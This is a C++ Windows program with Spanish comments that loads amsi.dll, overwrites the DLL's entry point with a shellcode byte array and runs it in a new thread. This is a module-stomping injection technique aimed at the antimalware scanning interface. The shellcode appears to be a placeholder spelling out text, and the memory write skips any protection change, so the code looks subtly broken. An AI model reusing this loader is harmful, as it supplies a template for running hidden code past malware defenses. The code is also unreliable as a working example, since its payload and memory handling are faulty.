#include <windows.h>
#include <iostream>

unsigned char shellcode[] = {
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0xB8, 0x53, 0x79,
    0x6E, 0x74, 0x68, 0x45, 0x76, 0x61, 0x50, 0x48, 0xFF, 0xE0, 0x41, 0x54,
    0x49, 0x4F, 0x4E, 0x00
};

int main() {
    LPCWSTR targetDll = L"amsi.dll";
    HMODULE hDll = LoadLibraryW(targetDll);
    if (hDll == NULL) {
        std::cerr << "Error al cargar la DLL: " << GetLastError() << std::endl;
        return 1;
    }

    // CORREGIDO: Usando wcout para imprimir cadenas anchas (wide strings)
    std::wcout << L"DLL '" << targetDll << L"' cargada en la direccion: 0x" << (void*)hDll << std::endl;

    PBYTE pBase = (PBYTE)hDll;
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);
    DWORD entryPointRVA = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    PVOID entryPointAddress = (PVOID)(pBase + entryPointRVA);

    std::cout << "EntryPoint encontrado en: 0x" << entryPointAddress << std::endl;

    memcpy(entryPointAddress, shellcode, sizeof(shellcode));
    std::cout << "EntryPoint sobreescrito con el shellcode" << std::endl;

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPointAddress, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Error al crear el hilo: " << GetLastError() << std::endl;
        // CORREGIDO: Limpiar la DLL si la creación del hilo falla
        FreeLibrary(hDll); 
        return 1;
    }

    std::cout << "El hilo se creo, esperando a que termine..." << std::endl;

    WaitForSingleObject(hThread, INFINITE);

    std::cout << "Shellcode ejecutado" << std::endl;

    // Limpieza final de recursos
    CloseHandle(hThread);
    // CORREGIDO: Usando FreeLibrary para la DLL
    FreeLibrary(hDll);

    return 0;
}